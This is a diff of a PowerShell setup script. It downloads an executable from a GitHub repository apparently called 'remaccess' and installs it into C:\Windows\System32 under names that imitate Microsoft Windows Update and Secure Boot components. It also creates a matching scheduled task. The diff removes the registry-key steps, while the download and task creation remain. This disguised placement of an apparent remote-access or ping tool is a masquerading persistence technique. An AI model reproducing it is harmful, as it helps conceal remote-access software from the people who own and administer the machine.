@@ -5,7 +5,6 @@ $localFilePath = "C:\Windows\System32\SecureBootUpdatesMicrosoft\WindowsUpdateSe
 $filePaths = @("C:\Windows\System32\WindowsUpdateServiceDaemon.exe", "C:\Windows\System32\SecureBootUpdatesMicrosoft\WindowsUpdateServiceDaemon.exe")
 $url = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/DiscordPingBotSimple.exe"
 $pingdaemontask = "Windows Update Service Daemon"
-$regPath = "HKLM:\SOFTWARE\Microsoft\MicrosoftUpdateServiceDaemon"
 #Purge of Ping Task
 $Name = "Deleteing the Ping Task and Related Files"
 $prompt = Read-Host "Proceed With $Name (y/n)"
@@ -23,11 +22,6 @@ foreach ($file in $filepath) {
         Remove-Item -Path $file -Force
     } else {}
 }
-#Removing Registry Keys
-if (Test-Path $regPath) {
-    Remove-Item -Path $regPath -Recurse -Force
-}
-} else {}
 #Creation of the setup
 $Name = "Creating a schedule task for Pinging"
 $prompt = Read-Host "Proceed With $Name (y/n)"
@@ -44,14 +38,7 @@ if (Test-Path -Path $localFilePath -PathType Leaf) {
 }
 try {
     Invoke-WebRequest -Uri $url -OutFile $localFilePath -UseBasicParsing
-} catch {
-}
-if (Test-Path $regPath) {
-    Remove-Item -Path $regPath -Recurse -Force | Out-Null
-}
-New-Item -Path $regPath -Force | Out-Null
-$nameValue = Read-Host "Enter a value for 'Name'"
-Set-ItemProperty -Path $regPath -Name 'Name' -Value $nameValue
+} catch {}
 #Create Windows Scheduled task
 $pingdaemonxml = @"
 <?xml version="1.0" encoding="UTF-16"?>
